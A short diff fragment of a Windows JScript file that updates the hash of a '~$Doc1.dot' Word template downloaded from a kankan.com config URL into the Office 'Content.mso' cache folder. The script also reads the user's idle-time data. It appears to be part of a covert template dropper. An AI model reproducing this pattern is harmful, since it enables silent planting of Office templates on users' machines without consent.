@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"83464F58E6623143507E9944C98249E1" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"E43B5D93BF0AF49859562AED85EEEF0A" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
